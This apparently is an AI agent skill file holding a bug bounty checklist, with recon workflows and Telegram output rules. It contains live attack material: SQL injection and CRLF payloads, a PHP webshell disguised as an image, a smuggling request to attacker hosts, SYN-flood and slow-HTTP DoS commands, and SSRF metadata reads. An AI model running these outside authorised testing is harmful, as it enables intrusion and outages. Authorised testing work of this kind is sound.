---
name: galaxy-bugbounty-checklist
description: "Comprehensive bug bounty hunting checklist — 2FA bypass, API security, account takeover, broken access control, CRLF, CSRF, DOS, file upload, HTTP smuggling, IIS, parameter pollution, open redirect, SQLi, SSRF. Use when testing web apps for vulnerabilities."
triggers:
  - bug bounty
  - pentest
  - web security testing
  - vulnerability checklist
  - bugbounty
---

# Galaxy Bug Bounty Checklist

Reference: https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist
Author: 0xmaximus | ⭐ 1.9k stars, 437 forks

---

## 1. 2FA Bypass

1. **Response manipulation** — intercept correct OTP response, swap into wrong OTP response
2. **Status code manipulation** — change 4xx → 200 OK
3. **Direct endpoint access** — skip to `/login/new_password` from `/login/otp_verification`
4. **Referrer check bypass** — set Referer header to 2FA page URL
5. **Developer console** — find `checkOTP(event)` function in DOM, run in console
6. **X-Forwarded-For** — add `X-Forwarded-For: 127.0.0.1` (also try `X-Originating-IP`, `X-Remote-IP`, `X-Client-IP`, `X-Host`, `X-Forwared-Host`)
7. **Session permission** — complete 2FA on your account, use same session boolean to access victim flow
8. **Token reuse** — replay already-used token
9. **Token sharing** — use your token on different account
10. **OTP leak in response** — check if token leaked in API response
11. **Brute force** — no rate limit → Burp Intruder

---

## 2. API Security (31 Days Checklist)

- Version switching: `api/v3/login` → `api/v1/login`
- Mobile vs web APIs differ — test both separately
- Verb tampering: `GET /api/trips/1` → `POST`, `DELETE`, `PUT`
- Numeric IDs from GUID: `GET /api/users/6b95d962-df38` → `GET /api/users/1`
- Wrap ID with array: `{"id":111}` → `{"id":[111]}`
- Wrap ID with object: `{"id":111}` → `{"id":{"id":111}}`
- HPP: `/api/profile?user_id=legit&user_id=victim`
- JPP: `{"user_id":legit,"user_id":victim}`
- Wildcard: `/api/users/*`, `/api/users/%`, `/api/users/_`
- Content-Type switch to `application/xml` (→ XXE)
- Non-production envs (staging/qa) less secure — leverage for bypass
- Export injection if "Convert to PDF" exists
- Test old APKs/IPAs for expanded attack surface

**Content-Type switching:**
```
x-www-form-urlencoded → user=test
application/json → {"user": "test"}
application/xml → <user>test</user>
```

**Unexpected data types:**
```json
{"username": true}
{"username": null}
{"username": 1}
{"username": [true]}
{"username": {"$neq": "lalala"}}
```

---

## 3. Account Takeover

- Signup with duplicate/existing email — may take over original
- Sleep injection in username/email param:
  ```
  orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
  ```
- Check if signup endpoint exposes existing account data

---

## 4. Broken Access Control

### 4.1 Unusual Characters Bypass (403 → 200)
```
site.com/admin     → 403
site.com/admin;    → 200
site.com/admin/    → 200
site.com/admin%09  → 200
site.com/admin%20  → 200
site.com/admin%2e  → 200
site.com/admin..;  → 200
site.com/admin;%09 → 200
site.com/admin/*   → 200
```

Full char list: `;` `/` `"` `'` `';` `";` `");` `');` `"]` `)]}` `%09` `%20` `%23` `%2e` `%2f` `.` `..;` `;%09..;` `;%2f..` `*`

### 4.2 Parameter Pollution
```
POST /page — Content-Type: application/x-www-form-urlencoded
id[]=10
```
Switch to JSON: `{"id": {10}}`

### 4.3 HTTP Verb Tampering
- Try HEAD, PUT, DELETE, TRACE, TRACK, arbitrary verbs ("JEFF")
- HEAD often bypasses GET/POST restrictions
- Vulnerable if: lists HTTP verbs, fails to block unlisted verbs, non-idempotent GET

---

## 5. CRLF Injection

**Add cookie:**
```
http://example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

**Response splitting → XSS:**
```
http://example.com/page.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```

**Filter bypass:** Try `%E5%98%8D%E5%98%8A` (Unicode), `%0d%0a`, `\r\n`, `%0D%0A`

---

## 6. CSRF Bypass (12 Techniques)

1. Change single char in token
2. Send empty token value
3. Replace with same-length string
4. Exploit via clickjacking
5. Change POST ↔ GET method
6. Remove CSRF parameter entirely
7. Use another user's valid token
8. Remove Referer header: `<meta name="referrer" content="no-referrer">`
9. Subdomain bypass: `victim.com.attacker.com`
10. Decrypt hash if token is hash-based
11. Gmail trick: `email+2=@gmail.com` sends to `email@gmail.com`
12. Chain CSRF with XSS to steal tokens

---

## 7. DOS Attacks

### 7.1 TCP SYN Flood
```bash
sudo apt-get install hping3
hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159
```

### 7.2 Slow HTTP GET/POST
```bash
sudo apt install slowhttptest
slowhttptest -c 10000 -H -g -o slowhttp -i 1 -r 2000 -t GET -u https://example.com -x 2400 -p 3
```

### 7.3 Big Entity / Long String
- Send massive POST data to root or password field
- Password field most likely (hashing = CPU exhaustion)
- Long string (100K+ chars) → compare response times, watch for 500 errors

---

## 8. File Upload

### Extension Impact
| Extension | Impact |
|-----------|--------|
| ASP/ASPX/PHP/PHP3/PHP5 | Webshell, RCE |
| SVG | Stored XSS, SSRF, XXE |
| GIF | Stored XSS, SSRF |
| CSV | CSV injection |
| XML | XXE |
| HTML/JS | XSS, Open redirect |
| PNG/JPEG | Pixel flood DoS |
| ZIP | RCE via LFI, DoS |
| PDF/PPTX | SSRF, Blind XXE |

### Bypass: Blacklisting
```
PHP: .phtm, .phtml, .phps, .pht, .php2-5, .shtml, .phar, .pgif, .inc
ASP: .asp, .aspx, .cer, .asa
JSP: .jsp, .jspx, .jsw, .jsv, .jspf
Random case: .pHp, .pHP5, .PhAr
```

### Bypass: Whitelisting
```
file.jpg.php          file.php%00.jpg
file.php%00           file.php%20
file.php%0d%0a.jpg    file.php..... 
file.php/             file.php#.png
file.php.\            file.
```

### Bypass: Content-Type
Upload `file.php` with `Content-Type: image/png` or `image/gif`

### Bypass: Magic Numbers
```bash
# PHP shell with JPG magic number
echo -n -e '\xFF\xD8\xFF\xE0\n<?php system($_GET["cmd"]); ?>' > shell.jpg.pHp
```
GIF header bypass: `GIF89a; <?php system($_GET['cmd']); ?>`

---

## 9. HTTP Request Smuggling

**CL.TE example:**
```http
POST /login HTTP/1.1
Host: target.com
Content-Length: 189
Transfer-Encoding: chunked
Transfer-Encoding: foo

3e
return_to=https%3A%2F%2Fevil.com%2F
0

GET / HTTP/1.1
Host: target.com:123
X-Forwarded-Host: attacker.net
Content-Length: 10

x=
```

Tools: Burp Turbo Intruder, Smuggler

---

## 10. IIS Specific

### Internal IP Disclosure
```http
GET / HTTP/1.0
# Strip Host header → Location header reveals internal IP
# Response: Location: https://192.168.5.237/owa/
```

### web.config ASP Execution
Upload web.config with ASP handler to execute code when .ASP upload is blocked.

---

## 11. Parameter Pollution

**First/Last occurrence parsing:**
```
id=100&id=101 → server uses first (100) or last (101)
```

**Comma-separated bypass:**
```
id=100,101 → may bypass single-parameter restriction
```

**All occurrences:** Check if WAF validates all params with same name

---

## 12. Open Redirect

### Finding
Google dorks:
```
inurl:go  inurl:return  inurl:r_url  inurl:returnUrl
inurl:returnUri  inurl:locationUrl  inurl:goTo  inurl:return_url
```

### Exploitation Chains
1. **Token stealing** — redirect after login leaks `?token=xxx` to attacker
2. **SSRF bypass** — open redirect on trusted domain bypasses SSRF blacklist
3. **XSS via `javascript:`** — if redirect is via JS (`top.location.href`), inject `javascript:alert(0)`

---

## 13. SQL Injection

### Logical Operation
```
?username=Peter → same as ?username=Peter' or ?username=Peter+'1'='1
```

### Time-Based Payloads
```sql
orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
')) or sleep(5)='
' WAITFOR DELAY '0:0:5'--
0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z
```

### sqlmap Usage
```bash
sqlmap -r request.txt -p param --force-ssl --level 5 --risk 3 --dbs
```
Tips: Change POST↔GET, use `--random-agent` for WAF bypass

### File Upload SQLi
```
--sleep(15).png
pic.png;waitfor delay '0:0:5'--
```

---

## 14. SSRF

### Port Scanning
```
vulnerable.com/?url=http://127.0.0.1:22
vulnerable.com/?url=http://localhost:port
vulnerable.com/?url=http://[::]:port
```
Blind SSRF: check Content-Length, Response Time, Status Code differences

### Local File Read
```
file:///etc/passwd
file:///C:/Windows/win.ini
file://\/\/etc/passwd
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/     (AWS)
http://metadata.google.internal/               (GCP)
http://169.254.169.254/metadata/instance       (Azure)
```

### Open Redirect → SSRF Chain
If endpoint only allows internal URLs, chain with open redirect:
```
?url=/redirect?goto=//169.254.169.254/latest/meta-data/
```

---

## 15. Practical Recon Methodology (Cloudflare-Protected Targets)

When target is behind Cloudflare, the real IP is hidden. Finding it is critical.

### Step 1: DNS Enumeration
```bash
# Check SPF records for real IP leak
curl -s "https://dns.google/resolve?name=target.com&type=TXT"
# Look for: v=spf1 +ip4:X.X.X.X (real IP!)

# Check MX records
curl -s "https://dns.google/resolve?name=target.com&type=MX"

# Common subdomains to probe
for sub in mail webmail cpanel whm ftp api admin portal login app dev staging ns1 ns2; do
  curl -s "https://dns.google/resolve?name=$sub.target.com&type=A"
done
```

### Step 2: Port Scan Real IP
```bash
# Quick TCP port scan (no nmap needed)
for port in 21 22 25 53 80 110 143 443 465 587 993 995 2083 2087 2095 2096 3306 3389 5432 8080 8443 8888 27017; do
  timeout 2 bash -c "echo >/dev/tcp/REAL_IP/$port" 2>/dev/null && echo "OPEN: $port"
done

# Banner grab for version detection
for port in 22 25 110 143 587; do
  echo "" | timeout 3 nc REAL_IP $port 2>/dev/null | head -1
done
```

### Step 3: Service-Specific Checks
```bash
# cPanel/WHM (ports 2083, 2087, 2095, 2096)
curl -sk "https://REAL_IP:2096"  # Webmail
curl -sk "https://REAL_IP:2087"  # WHM

# Exim SMTP version
echo "EHLO test" | timeout 5 nc REAL_IP 587

# Check exposed databases
mysql -h REAL_IP -u root --connect-timeout=5  # MySQL
psql -h REAL_IP -U postgres --connect-timeout=5  # PostgreSQL
mongosh --host REAL_IP --port 27017  # MongoDB
```

### Step 4: Version → CVE Lookup
- Exim: check exim.org + searchsploit
- cPanel: check cPanel security advisories
- Dovecot: check dovecot.org security page
- Nginx/Apache: check version-specific CVEs

### Step 5: Web Application Testing
```bash
# Crawl login pages
curl -sk "https://target.com/login" | grep -i "form\|input\|action"

# Check common paths
for path in /admin /login /api /wp-admin /cpanel /webmail /phpmyadmin /manager; do
  curl -sI "https://target.com$path" | head -3
done
```

See `references/recon-commands.md` for full command reference.

---

## 16. Next.js Application Recon

When target uses Next.js (`X-Powered-By: Next.js` or `_next/static/` in source).

### Key Attack Surface
1. **buildId extraction** — from `__NEXT_DATA__` script tag
2. **SSG data fetching** — `/_next/data/{buildId}/*.json` exposes all server-side data
3. **JavaScript chunk analysis** — hardcoded API endpoints, internal URLs, secrets
4. **NextAuth.js callbacks** — open redirect via `/api/auth/callback/*`
5. **Token/key leakage** in `pageProps` of `__NEXT_DATA__`

### Quick Check
```python
import re, json, requests
r = requests.get('https://target.com/')
match = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', r.text)
if match:
    data = json.loads(match.group(1))
    build_id = data['buildId']
    # Fetch SSG data
    r2 = requests.get(f'https://target.com/_next/data/{build_id}/login.json')
    if r2.status_code == 200:
        print(f"pageProps keys: {list(r2.json().get('props',{}).get('pageProps',{}).keys())}")
```

See `references/nextjs-recon.md` for full Next.js recon playbook.
See `references/webapp-recon-python.md` for Python-based recon when dig/nmap unavailable.

---

## Telegram Output Rules
- NEVER use tables — Telegram has no table syntax, use bullet lists or labeled key:value pairs
- For copy-paste content (reports, payloads, commands) use monospace code blocks
- Keep explanations concise — user prefers action over explanation
- Use inline code `like this` for short values (IPs, ports, URLs)

## Recon Workflow
See `references/recon-workflow.md` for full practical recon techniques:
- DNS enumeration via Google DNS-over-HTTPS (when dig unavailable)
- Origin IP discovery via SPF/MX records (Cloudflare bypass)
- Python-based port scanning with banner grabbing
- SMTP enumeration (VRFY, RCPT TO)
- cPanel/WHM detection and version fingerprinting
- HackerOne report template

## Quick Reference: Testing Order
## PoC Video Recording
See `references/poc-video-recording.md` for step-by-step Kali Linux screen recording guide with ffmpeg, including voice narration script template.

## Quick Reference: Testing Order

1. Recon — subdomains, ports, tech stack, dorking
2. Authentication — 2FA bypass, account takeover, password reset
3. Authorization — IDOR, broken access control, privilege escalation
4. Input — XSS, SQLi, SSTI, CRLF, command injection
5. File — upload bypass, LFI, XXE
6. API — verb tampering, parameter pollution, mass assignment
7. Infrastructure — SSRF, open redirect, subdomain takeover, CORS
8. Business logic — race conditions, DOS, price manipulation

---

## Recon Workflow (Proven)

### Phase 1: DNS & Infrastructure
```bash
# DNS records via Google DNS API (no tools needed)
curl -s "https://dns.google/resolve?name=TARGET&type=A"
curl -s "https://dns.google/resolve?name=TARGET&type=MX"
curl -s "https://dns.google/resolve?name=TARGET&type=TXT"  # SPF leaks real IP!
curl -s "https://dns.google/resolve?name=TARGET&type=NS"

# Subdomain brute force via DNS
for sub in www mail ftp api admin portal app dev staging webmail cpanel whm smtp imap pop ns1 ns2; do
  curl -s "https://dns.google/resolve?name=$sub.TARGET&type=A" | grep -o '"data":"[0-9.]*"'
done
```

### Phase 2: Origin IP Discovery (Cloudflare Bypass)
- Check SPF TXT record for leaked IPs (`+ip4:x.x.x.x`)
- Check MX records — mail servers often on real IP
- `host.`, `mail.`, `webmail.` subdomains often point to origin
- Verify with: `curl -sI http://REAL_IP` (check for redirect to cPanel/hostname)

### Phase 3: Port Scan (Python — no nmap needed)
```python
import socket
for port in [21,22,25,80,110,143,443,587,993,995,3306,3389,5432,8080,8443,27017]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    if s.connect_ex(('REAL_IP', port)) == 0:
        try:
            banner = s.recv(1024).decode(errors='ignore').strip()
            print(f'Port {port}: {banner[:100]}')
        except:
            print(f'Port {port}: open (no banner)')
    s.close()
```

### Phase 4: Service Enumeration
- SMTP: `EHLO test` + `VRFY user@domain` + RCPT TO enumeration
- FTP: anonymous login test
- cPanel: check ports 2083 (cPanel), 2087 (WHM), 2095 (webmail), 2096 (webmail SSL)
- SSH: banner grab for version

### Phase 5: Web Application
- Check all subdomains for login panels
- Test cPanel CVEs if version detected
- Crawl for hidden endpoints
- Check for exposed APIs

See `references/recon-workflow.md` for detailed commands and `references/hackerone-report-template.md` for report writing.

---

## Pitfalls

- **HackerOne Signal Requirement**: New hunters have limited reports (4-5). Quality > quantity. Don't submit incomplete reports.
- **Video PoC Required**: Some programs (like ALSCO) REQUIRE video demonstration. Record BEFORE submitting.
- **Out of Scope**: Always read program rules first. Common OOS: DoS, social engineering, brute force, missing cookie flags, clickjacking without sensitive action.
- **Duplicate Risk**: Programs open 1+ years likely have Cloudflare bypass already reported. Still submit — worst case is informative close.
- **Firewall vs Open Port**: `connect_ex()` returning 0 doesn't mean service is accessible. Many firewalls accept TCP but don't forward. Always verify with banner grab.
- **Real IP Testing**: Direct IP connections to web servers may timeout even if port is "open". cPanel/mail ports (2096, 587) are more reliable.
- **OCR for Screenshots**: When user sends screenshots, use `tesseract` via terminal: `python3 -c "from PIL import Image; import pytesseract; print(pytesseract.image_to_string(Image.open('path')))"`

---

## User Preferences

- Always provide copyable content in monospace code blocks (Telegram `inline code`)
- Keep explanations minimal — action > explanation
- Indonesian slang OK (gue/lo/bro)
- When filling forms, give exact text to copy-paste
- When recording PoC, give step-by-step script to follow
---

## Pitfalls

- **Cloudflare 403 on main domain** — always check SPF/MX/TXT records for real IP
- **Port scan false positives** — `/dev/tcp` may report all ports open on some firewalls. Use `nc` banner grab for verification
- **checksw.com-style test sites** — may have security features disabled; vulns found there may not apply to production
- **Program requires full exploit chain** — some programs (like ALSCO) only accept "edit the index page" or "download the database", not just "port is open"
- **Video proof required** — some programs mandate screen recording of the full attack
- **Bare Cloudflare IP = dead end**: Scanning a Cloudflare CDN IP (104.17.x.x, 172.64.x.x, etc.) directly won't work — all ports return 403, Host header needed. Use reverse IP lookup (HackerTarget, crt.sh) to find actual domains behind the IP first.
- **Out-of-scope penalties** — violating rules (DoS, social engineering, brute force) can get you permanently banned from the program
